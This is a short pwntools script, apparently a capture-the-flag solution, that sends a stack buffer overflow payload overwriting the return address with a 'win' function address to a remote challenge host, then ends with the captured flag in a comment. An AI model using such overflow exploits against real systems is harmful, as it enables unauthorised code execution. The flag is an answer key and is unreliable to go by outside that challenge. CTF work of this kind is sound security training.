from pwn import *

win_addr = 0x401176
pl = b'A'*(0x20+8) + p64(win_addr)

h,p = "freefall.chall.winja.site", 18967
io = remote(h,p)
print(io.recvuntil(b"I will let you overflow me").decode(), end='')
print(pl)
io.sendline(pl)
io.interactive()
# flag{7fbec6d149f9878499b4acd05e06c692_Did_B4BY_MaK3_YOu_OVeRCrY}